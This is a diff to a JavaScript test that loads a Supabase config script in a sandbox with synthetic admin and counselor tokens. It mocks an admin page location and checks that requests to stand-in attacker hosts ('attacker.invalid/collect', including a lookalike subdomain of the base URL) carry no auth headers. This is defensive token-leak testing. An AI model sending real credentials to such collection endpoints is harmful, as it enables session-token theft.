@@ -3,7 +3,8 @@ for(const file of ['web/supabase-config.js','legacy-web/supabase-config.js'])tes
  const calls=[],session=new Map([['xiaopingu_admin_token','synthetic-admin']]),local=new Map([['xiaopingu_counselor_token','synthetic-counselor']]);
  const storage=m=>({getItem:k=>m.get(k)||null,setItem:(k,v)=>m.set(k,v),removeItem:k=>m.delete(k)});
  const native=async(url,options)=>{calls.push({url,options});return {ok:true,json:async()=>({token:'new-synthetic-counselor'})};};
- const context={window:{fetch:native,location:{href:'https://synthetic.invalid/',hostname:'synthetic.invalid'}},sessionStorage:storage(session),localStorage:storage(local),Headers,URL,console};
+ const context={window:{fetch:native,location:{href:'https://synthetic.invalid/admin.html',pathname:'/admin.html',hostname:'synthetic.invalid'}},sessionStorage:storage(session),localStorage:storage(local),Headers,URL,console};
+ context.location=context.window.location;
  vm.createContext(context);vm.runInContext(fs.readFileSync(file,'utf8'),context);context.fetch=context.window.fetch;const base=context.SUPABASE_CONFIG.url;
  await context.fetch(base+'.attacker.invalid/collect',{});assert.equal(calls.at(-1).options.headers,undefined);
  await context.fetch('https://attacker.invalid/collect',{});assert.equal(calls.at(-1).options.headers,undefined);
